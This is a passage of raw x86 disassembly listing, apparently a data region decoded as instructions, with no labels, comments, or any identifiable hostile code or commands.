  405627:	cmp    BYTE PTR [ebp+ebx*1+0x11a40860],al
  40562e:	xchg   ebx,eax
  40562f:	or     DWORD PTR [eax],eax
  405631:	inc    esp
  405632:	add    BYTE PTR [edx+0x40813814],ah
  405638:	add    al,cl
  40563a:	inc    eax
  40563b:	push   0x10042980
  405640:	and    al,0x32
  405642:	add    BYTE PTR [eax+0x8],al
  405645:	(bad)  
  405646:	mov    al,ds:0x1085204a
  40564b:	dec    esp
  40564c:	inc    eax
  40564d:	dec    ecx
  40564e:	xor    BYTE PTR [eax+ecx*1],al
  405651:	pop    eax
  405652:	push   0x84209888
  405657:	mov    ds:0x402201,al
  40565c:	or     DWORD PTR [eax],0x34430010
  405662:	add    al,0x0
  405664:	add    al,dl
  405666:	add    al,BYTE PTR [eax+0x28]
  405669:	adc    DWORD PTR [edx-0x78],0x40c0410
  405670:	add    bl,BYTE PTR [eax]
  405672:	enter  0x1021,0xc8
  405676:	add    dl,BYTE PTR [eax]
  405678:	add    DWORD PTR ds:0x46410041,esp
  40567e:	popa   
  40567f:	push   es
  405680:	sbb    al,0x59
  405682:	pusha  
  405683:	jecxz  0x405685
  405685:	or     BYTE PTR [edx+edx*1+0x20],ah
  405689:	add    BYTE PTR [ebx+0x50],cl
  40568c:	add    BYTE PTR [edx+0x0],cl
  40568f:	inc    edx
  405690:	add    al,0x2
  405692:	adc    BYTE PTR [edx],ch
  405694:	mov    al,ds:0x4071a0
  405699:	call   0x10866c6
  40569e:	xor    eax,0x88000000
  4056a4:	inc    ebp
  4056a5:	or     eax,DWORD PTR fs:[eax+0x4120b300]
  4056ac:	add    DWORD PTR [eax+0x460241],esp
  4056b2:	add    BYTE PTR [ebx+0x8000084],al
  4056b8:	adc    DWORD PTR [esp+ebx*1],0x18000002
  4056bf:	add    BYTE PTR [eax+eiz*1-0x7ddbaff0],al
  4056c6:	mov    BYTE PTR [esp+ecx*2+0x61],cl
  4056ca:	or     BYTE PTR [edx+0x0],ah
  4056cd:	add    BYTE PTR [edx],al
  4056cf:	add    BYTE PTR [eax],al
  4056d1:	and    DWORD PTR [ecx+0x6],eax
  4056d4:	add    BYTE PTR [eax],al
  4056d6:	add    BYTE PTR [eax+ecx*1],al
  4056d9:	and    DWORD PTR [edx],eax
  4056db:	add    BYTE PTR [ebp+0x8],al
  4056de:	adc    BYTE PTR [eax],al
  4056e0:	add    BYTE PTR [eax+ecx*4],al
  4056e3:	add    BYTE PTR [eax],dl
  4056e5:	add    DWORD PTR [eax],eax
  4056e7:	add    BYTE PTR [eax],cl
  4056e9:	inc    eax
  4056ea:	and    BYTE PTR [eax],al
  4056ec:	xor    al,0x1
  4056ee:	stos   BYTE PTR es:[edi],al
  4056ef:	add    BYTE PTR [eax],al
  4056f1:	add    BYTE PTR [ecx],al
  4056f3:	add    DWORD PTR [ebp+0x41],ecx
  4056f6:	or     BYTE PTR [edx+eiz*1+0x3],bl
  4056fa:	add    al,0x0
  4056fc:	add    BYTE PTR [eax],ch
  4056fe:	add    BYTE PTR [esp+ecx*8],al
  405701:	inc    eax
  405702:	and    BYTE PTR [ecx+0x0],0x0
  405706:	pusha  
  405707:	xchg   ebx,eax
  405708:	or     BYTE PTR [ecx],dl
  40570a:	add    al,BYTE PTR [eax]
  40570c:	and    BYTE PTR [eax],al
  40570e:	or     DWORD PTR [eax],ecx
  405710:	bound  edx,QWORD PTR [edx]
  405712:	test   al,0x0
  405714:	(bad)
  405719:	add    BYTE PTR [eax],dl
  40571b:	xor    BYTE PTR [eax+0x4001104],dl
  405721:	add    BYTE PTR [eax],al
  405723:	adc    al,BYTE PTR [ecx]
  405725:	adc    al,BYTE PTR [eax]
  405727:	add    BYTE PTR [eax+0x40080082],cl
  40572d:	add    BYTE PTR [eax-0x3b],cl
  405730:	and    BYTE PTR [esi],al
  405732:	inc    eax
  405733:	add    BYTE PTR [edx+0x0],0x0
  405737:	mov    BYTE PTR [eax],al
  405739:	add    BYTE PTR [eax-0x2db7e800],al
  40573f:	mov    al,ds:0x800a40c
  405744:	add    BYTE PTR [eax],al
  405746:	inc    edx
  405747:	adc    BYTE PTR [eax+ecx*1],dl
  40574a:	adc    BYTE PTR [ebx],al
  40574c:	and    BYTE PTR [ecx+0x40058112],cl
  405752:	add    DWORD PTR [ecx],eax
  405754:	or     BYTE PTR [ebx+ecx*4+0x40820108],ah
  40575b:	add    BYTE PTR [eax],al
  40575d:	add    BYTE PTR [eax],al
  40575f:	add    BYTE PTR [ebx+edx*4],cl
  405762:	xor    DWORD PTR [eax],esi
  405764:	and    BYTE PTR [eax],al
  405766:	or     BYTE PTR [esi],ah
  405768:	add    ebp,DWORD PTR [eax]
  40576a:	inc    esp
  40576b:	add    BYTE PTR [eax],dl
  40576d:	add    DWORD PTR [eax],eax
  40576f:	and    al,0x45
  405771:	and    BYTE PTR [ecx+edx*4+0x20b00000],al
  405778:	and    BYTE PTR [ecx-0x7fffffcf],al
  40577e:	and    BYTE PTR [eax],0x0
  405781:	inc    eax
  405782:	jmp    0x262578a
  405787:	or     BYTE PTR [edx],al
  405789:	test   BYTE PTR [eax+0x30164290],al
  40578f:	dec    edx
  405790:	add    bl,cl
  405792:	add    BYTE PTR [eax],al
  405794:	sbb    al,al
  405796:	add    BYTE PTR ds:0xa000a900,al
  40579c:	add    DWORD PTR [eax+0x0],eax
  40579f:	or     BYTE PTR [ecx+0x40200220],al
  4057a5:	or     BYTE PTR [ecx],al
  4057a7:	test   BYTE PTR [eax],al
  4057a9:	add    DWORD PTR [ebp+0xc0010d],ecx
  4057af:	inc    edx
  4057b0:	ret    0x50a0
  4057b3:	add    BYTE PTR [eax],al
  4057b5:	add    cl,ah
  4057b7:	add    al,BYTE PTR [ebp-0x75f7f5e0]
  4057bd:	add    BYTE PTR [eax],al
  4057bf:	add    BYTE PTR [eax+eax*8+0x4c44600],al
  4057c6:	add    BYTE PTR [edx+edx*1+0x4a],al
  4057ca:	add    BYTE PTR [eax],al
  4057cc:	adc    al,0x20
  4057ce:	sub    al,ch
  4057d0:	add    BYTE PTR [eax],al
  4057d2:	and    BYTE PTR [eax-0x4fdff7fc],cl
  4057d8:	push   es
  4057d9:	and    BYTE PTR [eax],al
  4057db:	mov    ah,BYTE PTR [eax]
  4057dd:	add    BYTE PTR [eax],0x0
  4057e0:	add    al,0x8a
  4057e2:	add    BYTE PTR [eax],al
  4057e4:	add    al,0xa4
  4057e6:	add    al,BYTE PTR [eax]
  4057e8:	pusha  
  4057e9:	or     BYTE PTR ds:0x3004902,dh
  4057ef:	adc    BYTE PTR [edx-0x3fffffee],al
  4057f5:	add    BYTE PTR [eax-0x3e],al
  4057f8:	inc    eax
  4057f9:	mov    BYTE PTR [eax+0x0],al
  4057fc:	and    al,BYTE PTR [eax]
  4057fe:	add    BYTE PTR [ebx+0x2],al
  405801:	add    eax,0x14000000
  405806:	dec    edi
  405807:	add    BYTE PTR [eax],al
  405809:	push   es
  40580a:	add    BYTE PTR [ecx+0x5007040],al
  405810:	inc    eax
  405811:	inc    eax
  405812:	or     BYTE PTR [eax],al
  405814:	add    BYTE PTR [esp+edx*1+0x48],dl
  405818:	add    DWORD PTR [eax+0x220000ac],esp
  40581e:	or     BYTE PTR [esi],ah
  405820:	adc    eax,DWORD PTR [eax]
  405822:	rol    BYTE PTR [eax],1
  405824:	dec    eax
  405825:	ret    
  405826:	mov    al,0x0
  405828:	and    BYTE PTR [ebx+0x0],cl
  40582b:	mov    BYTE PTR [esi],al
  40582d:	or     al,0x1
  40582f:	add    BYTE PTR [eax-0x78],dh
  405832:	add    eax,0x20028a0a
  405837:	inc    eax
  405838:	inc    eax
  405839:	add    BYTE PTR [eax],dl
  40583b:	add    BYTE PTR [eax+eax*1],ah
  40583e:	or     BYTE PTR [ebp-0x7e9bc9fe],cl
  405844:	leave  
  405845:	add    DWORD PTR [ecx],ebp
  405847:	add    BYTE PTR [eax+0x11],0x10
  40584e:	push   es
  40584f:	add    dl,BYTE PTR [ecx]
  405851:	add    BYTE PTR [eax],al
  405853:	add    al,BYTE PTR [eax+eax*1]
  405856:	pop    eax
  405857:	add    DWORD PTR [ecx-0x7dff7d00],ebp
  40585d:	pusha  
  40585e:	sbb    BYTE PTR [ebx],0x4
  405861:	add    DWORD PTR [eax],eax
  405863:	xchg   edx,eax
  405864:	adc    BYTE PTR [eax],ah
  405866:	sub    al,0x20
  405868:	adc    BYTE PTR [eax+0x8],ch
  40586b:	add    al,al
  40586d:	rol    BYTE PTR [eax],1
  40586f:	push   esp
  405870:	push   eax
  405871:	add    DWORD PTR [eax],esp
  405873:	add    BYTE PTR [eax+eax*4+0x10],al
  405877:	push   ss
  405878:	adc    BYTE PTR ds:0x2d6e011,ah
  40587e:	pusha  
  40587f:	or     BYTE PTR [eax+eiz*8],0x40
  405883:	adc    al,BYTE PTR [eax]
  405885:	add    BYTE PTR [eax],0x0
  405888:	adc    BYTE PTR [eax],al
  40588a:	and    DWORD PTR [ecx+eiz*4],edx
  40588d:	add    BYTE PTR [ebx+0x0],al
  405890:	xchg   ecx,eax
  405891:	add    BYTE PTR [eax],0x0
  405894:	sbb    al,0x0
  405896:	inc    ecx
  405897:	or     BYTE PTR [eax],dl
  405899:	sub    BYTE PTR [eax-0x70],al
  40589c:	inc    eax
  40589d:	mov    DWORD PTR [edx],eax
  40589f:	add    BYTE PTR [ecx],bl
  4058a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058a2:	add    BYTE PTR [eax+0x50],dl
  4058a5:	add    al,BYTE PTR [eax]
  4058a7:	push   es
  4058a8:	add    DWORD PTR [ebx+0x144200],esp
  4058ae:	add    BYTE PTR [eax],al
  4058b0:	add    DWORD PTR [eax+0x52081036],eax
  4058b6:	and    al,0x40
  4058b8:	mov    dl,al
  4058ba:	add    BYTE PTR [eax],dl
  4058bc:	jb     0x40591f
  4058be:	add    BYTE PTR [eax],al
  4058c0:	add    al,0x8
  4058c2:	jp     0x405904
  4058c4:	add    BYTE PTR [edx],cl
  4058c6:	add    al,0x10
  4058c8:	add    BYTE PTR [edx-0x73357fa4],al
  4058ce:	inc    esp
  4058cf:	pop    eax
  4058d0:	add    DWORD PTR [eax+0x40],esp
  4058d3:	add    cl,BYTE PTR [eax+0x40ca18]
  4058d9:	sbb    al,0x5
  4058dc:	or     DWORD PTR [eax+0x1],eax
  4058df:	add    al,BYTE PTR [eax]
  4058e1:	or     dl,BYTE PTR [eax+0x0]
  4058e4:	add    al,0x12
  4058e6:	add    BYTE PTR [eax],al
  4058e8:	aaa    
  4058e9:	adc    BYTE PTR [eax],al
  4058eb:	xor    al,0x68
  4058ed:	add    BYTE PTR [ecx],al
  4058ef:	add    al,0xe0
  4058f1:	add    BYTE PTR [edx],al
  4058f3:	sbb    BYTE PTR [edx+eax*1],ch
  4058f6:	inc    esp
  4058f7:	add    BYTE PTR [eax],cl
  4058f9:	add    BYTE PTR [eax],0xf
  4058fc:	add    al,0x3
  4058fe:	or     BYTE PTR [edx],al
  405900:	and    BYTE PTR [eax],cl
  405902:	add    BYTE PTR [ebx],cl
  405904:	and    BYTE PTR [eax-0x79effff7],dh
  40590a:	shl    BYTE PTR [eax],0x0
  40590d:	add    al,ch
  40590f:	dec    ecx
  405910:	add    BYTE PTR [edx+edx*1],dl
  405913:	inc    edx
  405914:	add    ah,BYTE PTR [eax]
  405916:	mov    al,ds:0x400042b2
  40591b:	add    BYTE PTR [eax],bl
  40591d:	add    BYTE PTR [eax],0x1
  405920:	nop
  405921:	add    BYTE PTR [ecx+0x20],al
  405924:	or     al,BYTE PTR [eax]
  405926:	sub    BYTE PTR [eax-0x5fb7fdef],ah
  40592c:	add    al,BYTE PTR [eax-0x80]
  40592f:	add    BYTE PTR [eax+0x76],bl
  405932:	dec    ecx
  405933:	mov    BYTE PTR [ecx],al
  405935:	dec    ecx
  405936:	test   BYTE PTR [eax],al
  405938:	inc    eax
  405939:	add    BYTE PTR [eax],al
  40593b:	and    BYTE PTR [ecx],al
  40593d:	lock add DWORD PTR [edx+eax*1-0x7e],eax
  405942:	les    edx,FWORD PTR [eax]
  405944:	and    DWORD PTR [ecx],0x28
  405947:	or     BYTE PTR [ebx],al
  405949:	dec    eax
  40594a:	inc    eax
  40594b:	add    BYTE PTR [eax],al
  40594d:	jo     0x40594f
  40594f:	add    BYTE PTR [edx+0x2012028],dl
  405955:	add    BYTE PTR [ecx],ah
  405957:	sbb    al,BYTE PTR [eax+0x19602480]
  40595d:	inc    eax
  40595e:	and    BYTE PTR [eax+0x18405004],al
  405964:	add    BYTE PTR [eax],al
  405966:	add    BYTE PTR [edx],al
  405968:	dec    eax
  405969:	inc    eax
  40596a:	adc    BYTE PTR [eax],ah
  40596c:	add    BYTE PTR [eax],al
  40596e:	cmp    BYTE PTR [eax],al
  405970:	add    DWORD PTR [edx+eax*1+0x8202800],esp
  405977:	cmp    BYTE PTR [eax],cl
  405979:	or     BYTE PTR [eax+0x40000106],al
  40597f:	add    BYTE PTR [edx],bl
  405981:	add    BYTE PTR [eax+eax*1],ah
  405984:	jns    0x405986
  405986:	and    al,0x0
  405988:	add    BYTE PTR [eax+0x21002208],0x0
  40598f:	add    BYTE PTR [ebx],dh
  405991:	add    DWORD PTR [eax],esp
  405993:	mov    ds:0x9b00d0,al
  405998:	inc    esp
  405999:	mov    BYTE PTR [ecx],ah
  40599b:	inc    edx
  40599c:	xor    al,0x0
  40599e:	add    BYTE PTR [eax],bh
  4059a0:	sub    dh,BYTE PTR [eax-0x80]
  4059a3:	add    DWORD PTR [eax+0x460293],eax
  4059a9:	or     al,0x8
  4059ab:	inc    eax
  4059ac:	add    BYTE PTR [eax],al
  4059ae:	adc    BYTE PTR [edx],bl
  4059b0:	dec    ecx
  4059b1:	adc    eax,0x28828200
  4059b6:	enter  0xa002,0x20
  4059ba:	add    al,BYTE PTR [ecx]
  4059bc:	inc    esp
  4059bd:	add    DWORD PTR [eax],eax
  4059bf:	add    cl,BYTE PTR [edx]
  4059c1:	adc    al,BYTE PTR [ecx+edx*1]
  4059c4:	pop    esp
  4059c5:	add    BYTE PTR [ebp+eax*1+0x21],cl
  4059c9:	adc    BYTE PTR [eax],al
  4059cb:	mov    WORD PTR [eax],es
  4059cd:	mov    al,ds:0x60240040
  4059d2:	adc    BYTE PTR [eax+0x28],al
  4059d5:	or     al,dl
  4059d7:	mov    BYTE PTR [edx],al
  4059d9:	add    BYTE PTR [edx+0x4],al
  4059dc:	add    edx,DWORD PTR [eax]
  4059de:	xor    BYTE PTR [eax],al
  4059e0:	or     BYTE PTR [edx],al
  4059e2:	add    edx,DWORD PTR [eax+eax*1+0xe094200]
  4059e9:	add    BYTE PTR [eax+0xa],dl
  4059ec:	inc    esp
  4059ed:	or     al,BYTE PTR [edx]
  4059ef:	add    BYTE PTR [edx],al
  4059f1:	sub    BYTE PTR [edx],0xa4
  4059f4:	add    DWORD PTR [esi-0x77bfffff],eax
  4059fa:	add    DWORD PTR [eax],eax
  4059fc:	push   eax
  4059fd:	add    BYTE PTR [eax],al
  4059ff:	inc    edx
  405a00:	cwde   
  405a01:	add    BYTE PTR [eax],cl
  405a03:	adc    BYTE PTR [ecx],dl
  405a05:	add    BYTE PTR [eax+0x4080848],al
  405a0b:	inc    eax
  405a0c:	adc    al,dl
  405a0e:	dec    esp
  405a0f:	and    BYTE PTR [eax],al
  405a11:	test   BYTE PTR [ecx+eax*1],al
  405a14:	add    al,BYTE PTR [eax]
  405a16:	popa   
  405a17:	add    al,0x21
  405a19:	inc    eax
  405a1a:	add    BYTE PTR [eax],cl
  405a1c:	add    BYTE PTR [edx],al
  405a1e:	add    BYTE PTR [edx],al
  405a20:	rcl    ebp,1
  405a22:	add    BYTE PTR [eax+0x101400a],al
  405a28:	or     BYTE PTR [edi+0x71420120],0x0
  405a2f:	add    BYTE PTR [ebp+eax*1+0x2],ah
  405a33:	add    BYTE PTR [eax],al
  405a35:	add    BYTE PTR [edx+0x9],0x3
  405a39:	add    DWORD PTR [eax],eax
  405a3b:	or     BYTE PTR [ecx-0x78],dh
  405a3e:	inc    edx
  405a3f:	ins    BYTE PTR es:[edi],dx
  405a40:	add    al,0x2
  405a42:	add    eax,DWORD PTR [eax]
  405a44:	sub    BYTE PTR [edx],al
  405a46:	add    DWORD PTR [ecx+0x0],esi
  405a49:	or     ecx,DWORD PTR [ebx]
  405a4b:	adc    BYTE PTR [eax],al
  405a4d:	push   ebx
  405a4e:	inc    edx
  405a4f:	cwde   
  405a50:	add    BYTE PTR [eax+0x0],cl
  405a53:	or     BYTE PTR [edx],cl
  405a55:	add    BYTE PTR [eax],cl
  405a57:	and    al,BYTE PTR [ecx+0x2]
  405a5a:	and    al,BYTE PTR [edx+0x20c091]
  405a60:	cwde   
  405a61:	str    WORD PTR [eax]
  405a64:	add    BYTE PTR [ecx],cl
  405a66:	inc    esp
  405a67:	add    al,BYTE PTR [eax]
  405a69:	xchg   edx,eax
  405a6a:	add    DWORD PTR [ecx],ecx
  405a6c:	add    BYTE PTR [eax],ah
  405a6e:	shl    BYTE PTR [eax],0x31
  405a71:	or     al,BYTE PTR [eax]
  405a73:	cmp    BYTE PTR [eax],cl
  405a75:	inc    eax
  405a76:	add    BYTE PTR [eax+0x20],dl
  405a79:	rol    DWORD PTR [eax+0x40],0x8c
  405a7d:	inc    esp
  405a7e:	rcl    BYTE PTR [eax+0x2],1
  405a81:	mov    BYTE PTR [eax],dl
  405a83:	add    BYTE PTR [edx],cl
  405a85:	inc    edx
  405a86:	add    DWORD PTR [eax],eax
  405a88:	add    BYTE PTR [eax],cl
  405a8a:	or     al,0xa1
  405a8c:	or     BYTE PTR [ecx],ah
  405a8e:	push   es
  405a8f:	inc    edx
  405a90:	or     BYTE PTR [eax],ah
  405a92:	add    ecx,DWORD PTR [eax+0x0]
  405a95:	mov    al,0x7c
  405a97:	adc    DWORD PTR [eax+0x21a504],esp
  405a9d:	mov    al,ds:0x2520584
  405aa2:	add    BYTE PTR [eax-0x7fbdef74],al
  405aa8:	mov    BYTE PTR [edx+ebx*1-0x33],cl
  405aac:	inc    edx
  405aad:	nop
  405aae:	add    BYTE PTR [eax],cl
  405ab0:	xchg   DWORD PTR [eax],esp
  405ab2:	add    BYTE PTR [edx],0xad
  405ab5:	or     BYTE PTR [eax],dl
  405ab7:	add    al,BYTE PTR [ebx]
  405ab9:	adc    BYTE PTR [edx],al
  405abb:	adc    al,0x9
  405abd:	cdq    
  405abe:	add    DWORD PTR [eax+ebp*1+0x8],edx
  405ac2:	push   esi
  405ac3:	sub    al,0x28
  405ac5:	and    BYTE PTR [eax],cl
  405ac7:	add    al,0x32
  405ac9:	add    BYTE PTR [edx+eax*1-0x78ffdeeb],dh
  405ad0:	adc    BYTE PTR [ebp+0x23040341],0x18
  405ad7:	and    al,BYTE PTR [ecx]
  405ad9:	inc    eax
  405ada:	adc    BYTE PTR [eax],cl
  405adc:	adc    BYTE PTR [eax],dl
  405ade:	inc    ecx
  405adf:	ror    DWORD PTR [eax],1
  405ae1:	or     BYTE PTR [eax],0x43
  405ae4:	inc    edx
  405ae5:	add    BYTE PTR [ecx+ebx*2+0x20],al
  405ae9:	add    al,cl
  405aeb:	adc    BYTE PTR [eax+ecx*4+0x68000810],ah
  405af2:	xor    BYTE PTR [ecx],al
  405af4:	add    BYTE PTR [eax+0x4a],al
  405af7:	inc    eax
  405af8:	add    al,bl
  405afa:	loopne 0x405b44
  405afc:	add    BYTE PTR [ecx],dl
  405afe:	dec    eax
  405aff:	add    DWORD PTR [ebx+eiz*1],eax
  405b02:	jecxz  0x405b0a
  405b04:	adc    BYTE PTR [eax],dh
  405b06:	loopne 0x405b52
  405b08:	add    BYTE PTR [edx+0x40441e01],al
  405b0e:	add    ecx,DWORD PTR [eax+eax*1]
  405b11:	adc    DWORD PTR [edx],edx
  405b13:	adc    al,al
  405b15:	or     ah,BYTE PTR [eax]
  405b17:	add    al,0x45
  405b19:	lock rcl BYTE PTR [edx+0x1],0x60
  405b1e:	add    BYTE PTR [eax],0x1
  405b21:	add    DWORD PTR [eax+0x6],0x0
  405b25:	inc    esi
  405b26:	sbb    DWORD PTR [ecx],eax
  405b28:	adc    al,0x0
  405b2a:	add    eax,0x4008
  405b2f:	nop
  405b30:	add    eax,0x80298df2
  405b35:	add    BYTE PTR [eax],0x51
  405b38:	dec    eax
  405b39:	adc    BYTE PTR [eax+0x0],al
  405b3c:	add    dh,BYTE PTR [eax+0x31021061]
  405b42:	add    BYTE PTR [edx-0x79db67a0],ah
  405b48:	add    BYTE PTR [eax],ah
  405b4a:	adc    DWORD PTR [ebx+0x40000],0xe803a904
  405b54:	add    BYTE PTR [edx+0x40],al
  405b57:	add    BYTE PTR [eax],cl
  405b59:	and    DWORD PTR [esi],ebp
  405b5b:	or     BYTE PTR [eax+0x0],cl
  405b5e:	rol    BYTE PTR [eax],0x4
  405b61:	push   eax
  405b62:	sbb    BYTE PTR [eax+0x19],al
  405b65:	mov    al,ds:0x2620040
  405b6a:	and    BYTE PTR [edx],0x0
  405b6d:	adc    esp,DWORD PTR [edi+0x20]
  405b70:	inc    eax
  405b71:	inc    ebx
  405b72:	and    BYTE PTR [eax+ecx*1],ah
  405b75:	add    DWORD PTR [eax],ecx
  405b77:	inc    ecx
  405b78:	add    BYTE PTR [ebx],ch
  405b7a:	and    BYTE PTR [eax+0x14],al
  405b7d:	add    dl,dl
  405b7f:	inc    eax
  405b80:	add    BYTE PTR [esi+0x0],al
  405b83:	or     al,0x0
  405b86:	add    al,0x84
  405b88:	inc    eax
  405b89:	add    BYTE PTR [eax],0xc2
  405b8c:	and    al,0x0
  405b8e:	add    BYTE PTR [edx+0x1],0x14
  405b92:	adc    BYTE PTR [ecx-0x7c],0x27
  405b96:	inc    eax
  405b97:	add    BYTE PTR [edx],0x8b
  405b9a:	adc    DWORD PTR [edx+0xa0008],ebx
  405ba0:	add    BYTE PTR [ecx-0x76ffff78],ah
  405ba6:	and    BYTE PTR [edx],al
  405ba8:	add    BYTE PTR [ecx],al
  405baa:	inc    eax
  405bab:	rol    DWORD PTR [eax],0x0
  405bae:	dec    eax
  405baf:	pop    eax
  405bb0:	leave  
  405bb1:	add    BYTE PTR [eax],dl
  405bb3:	and    BYTE PTR [eax+esi*1-0x54bd7fef],0x0
  405bbb:	and    al,0x90
  405bbd:	add    BYTE PTR [eax],al
  405bbf:	or     BYTE PTR [edx+0x0],al
  405bc2:	or     BYTE PTR [eax+ecx*1+0x40a1b0],0x8
  405bca:	retf   0x10e
  405bcd:	pop    ecx
  405bce:	add    BYTE PTR [edx+0x0],dl
  405bd1:	inc    esp
  405bd2:	inc    edi
  405bd3:	or     cl,BYTE PTR [eax]
  405bd5:	inc    eax
  405bd6:	add    BYTE PTR [ecx],al
  405bd8:	adc    cl,BYTE PTR [eax]
  405bda:	add    BYTE PTR [eax+0x1],al
  405bdd:	scas   eax,DWORD PTR es:[edi]
  405bde:	adc    eax,0xd00004c0
  405be4:	add    BYTE PTR [eax],cl
  405be6:	je     0x405c08
  405be8:	add    DWORD PTR [eax+0x8501243],eax
  405bee:	add    BYTE PTR [edx],al
  405bf0:	inc    eax
  405bf1:	add    BYTE PTR [ebx],al
  405bf3:	add    al,BYTE PTR [ecx]
  405bf5:	add    bl,BYTE PTR [ecx+0x20189040]
  405bfb:	xor    BYTE PTR gs:[eax+0x42001048],0x29
  405c03:	add    BYTE PTR [edx],cl
  405c05:	adc    al,0x51
  405c07:	or     BYTE PTR [eax],0x9
  405c0a:	loopne 0x405c34
  405c0c:	add    al,0x0
  405c0e:	adc    al,0x0
  405c10:	push   eax
  405c11:	add    BYTE PTR [eax+eax*8],ah
  405c14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c15:	add    cl,BYTE PTR [eax-0x5e]
  405c18:	adc    ecx,DWORD PTR [eax]
  405c1a:	or     ah,BYTE PTR [eax]
  405c1c:	add    ch,BYTE PTR [eax+0x3010d011]
  405c22:	mov    eax,ds:0x40400001
  405c27:	ror    DWORD PTR [edx],1
  405c29:	rcl    BYTE PTR [eax],0x80
  405c2c:	adc    DWORD PTR [eax],eax
  405c2e:	add    al,0x0
  405c30:	add    eax,DWORD PTR [eax]
  405c32:	add    BYTE PTR [eax],al
  405c34:	enter  0x24a4,0x0
  405c38:	add    BYTE PTR [eax+0x40088041],ah
  405c3e:	and    al,BYTE PTR [ecx]
  405c40:	sbb    BYTE PTR ds:0x40180c01,dl
  405c46:	mov    BYTE PTR [eax],al
  405c48:	adc    BYTE PTR [eax+eax*2],cl
  405c4b:	test   al,cl
  405c4d:	add    BYTE PTR [edx+ebp*4],cl
  405c50:	add    BYTE PTR [esi],dl
  405c52:	push   eax
  405c53:	cmp    al,0x49
  405c55:	add    BYTE PTR [esi+0x2020100],al
  405c5b:	add    cl,BYTE PTR [eax]
  405c5d:	add    BYTE PTR [ecx],al
  405c5f:	add    BYTE PTR [eax],al
  405c61:	add    BYTE PTR [eax+0x6],ah
  405c64:	rol    BYTE PTR [edx],0x0
  405c67:	add    BYTE PTR [ecx],0x40
  405c6a:	add    BYTE PTR [ecx+0x1000028],al
  405c70:	add    BYTE PTR [eax],al
  405c72:	sbb    BYTE PTR [edx+0x42],dl
  405c75:	adc    BYTE PTR [edx],ah
  405c77:	xor    BYTE PTR [eax+eax*2+0x4112000],al
  405c7e:	sbb    BYTE PTR [ecx],al
  405c80:	add    BYTE PTR [edx+0xf],bh
  405c86:	add    BYTE PTR [eax],0xc0
  405c89:	add    BYTE PTR [ecx],al
  405c8b:	xor    BYTE PTR [eax],cl
  405c8d:	inc    ebx
  405c8e:	add    BYTE PTR [eax],ah
  405c90:	sub    BYTE PTR [esp+eax*1],al
  405c93:	test   al,0x5d
  405c95:	and    eax,0x60043ac8
  405c9a:	inc    edx
  405c9b:	stos   BYTE PTR es:[edi],al
  405c9c:	shl    BYTE PTR [edx],1
  405c9e:	inc    ecx
  405c9f:	add    BYTE PTR [ecx],al
  405ca1:	or     BYTE PTR [eax+ecx*4],al
  405ca4:	push   0xc0340060
  405ca9:	or     BYTE PTR [ecx+0x11252],dl
  405caf:	or     al,BYTE PTR [edx]
  405cb1:	add    BYTE PTR [eax],0x44
  405cb4:	add    DWORD PTR [eax],eax
  405cb6:	and    al,BYTE PTR [eax+ebp*1]
  405cb9:	xor    al,0xc0
  405cbb:	add    al,BYTE PTR [eax]
  405cbd:	add    BYTE PTR [eax],al
  405cbf:	add    ah,dl
  405cc1:	sub    BYTE PTR [eax+0x15404000],cl
  405cc7:	add    BYTE PTR [ecx],al
  405cc9:	push   0x8541010
  405cce:	add    BYTE PTR [eax],dl
  405cd0:	add    BYTE PTR [eax],al
  405cd2:	cmp    DWORD PTR [edx],ebx
  405cd4:	add    DWORD PTR [ebx],ebp
  405cd6:	or     BYTE PTR [edx+0x8],al
  405cd9:	add    esp,DWORD PTR [ecx]
  405cdb:	imul   eax,DWORD PTR [eax],0x32
  405cde:	add    BYTE PTR [esi-0x80],dl
  405ce1:	or     BYTE PTR [eax+0x8],al
  405ce4:	add    BYTE PTR [ebx],al
  405ce6:	add    BYTE PTR ds:0xa4098,cl
  405cec:	inc    eax
  405ced:	add    BYTE PTR [eax],0x10
  405cf0:	add    BYTE PTR [eax],dl
  405cf2:	inc    eax
  405cf3:	pushf  
  405cf4:	add    BYTE PTR [ebx-0x6ffd7e00],dl
  405cfa:	add    BYTE PTR [eax+0x10108010],al
  405d00:	add    esp,eax
  405d02:	xor    dh,al
  405d04:	inc    eax
  405d05:	add    DWORD PTR [eax],eax
  405d07:	or     al,0x70
  405d09:	sbb    DWORD PTR [eax],eax
  405d0b:	data16 add BYTE PTR [ecx],al
  405d0e:	add    DWORD PTR [ebx-0x70],eax
  405d11:	dec    ecx
  405d12:	adc    DWORD PTR [eax-0x80],eax
  405d15:	sbb    al,0xaa
  405d17:	and    BYTE PTR [eax],al
  405d19:	adc    al,0x11
  405d1b:	cwde   
  405d1c:	lds    ecx,FWORD PTR [ecx-0x5c]
  405d1f:	inc    edx
  405d20:	and    BYTE PTR [edx+eax*4],0x6b
  405d24:	push   eax
  405d25:	add    BYTE PTR [ecx+0x6],ch
  405d28:	add    al,0x93
  405d2a:	add    BYTE PTR [eax],al
  405d2c:	mov    eax,ds:0x8003160b
  405d31:	lock add BYTE PTR [edx],cl
  405d34:	add    BYTE PTR [ecx+eax*2],bl
  405d37:	add    DWORD PTR [ecx+ebx*8],edx
  405d3a:	or     BYTE PTR [eax+0x0],cl
  405d3d:	dec    edx
  405d3e:	popa   
  405d3f:	shl    BYTE PTR [eax],0xa8
  405d42:	cmp    al,0x0
  405d44:	add    al,0x20
  405d46:	and    DWORD PTR [eax+ebp*1+0x0],edx
  405d4a:	and    DWORD PTR ds:0xc00681,eax
  405d50:	rol    BYTE PTR [edx+0x12],0x58
  405d54:	lds    eax,FWORD PTR [eax+0x40]
  405d57:	mov    al,ds:0xc0290308
  405d5c:	nop
  405d5d:	add    BYTE PTR [ebp-0x80],0x0
  405d61:	sbb    DWORD PTR [eax],ecx
  405d63:	adc    eax,DWORD PTR [eax]
  405d65:	and    DWORD PTR [ebp-0x7e593dfa],eax
  405d6b:	add    BYTE PTR [edx-0x80],cl
  405d6e:	add    BYTE PTR [eax+0x41],al
  405d71:	add    BYTE PTR [eax],ch
  405d73:	or     DWORD PTR [eax],eax
  405d75:	add    BYTE PTR [eax],al
  405d77:	add    DWORD PTR [eax],ecx
  405d79:	and    cl,BYTE PTR [ecx]
  405d7b:	sub    BYTE PTR [eax],0x2
  405d7e:	repnz or BYTE PTR [eax+0x40100242],0x41
  405d86:	(bad)
  405d89:	dec    eax
  405d8a:	add    DWORD PTR [eax],ecx
  405d8c:	dec    eax
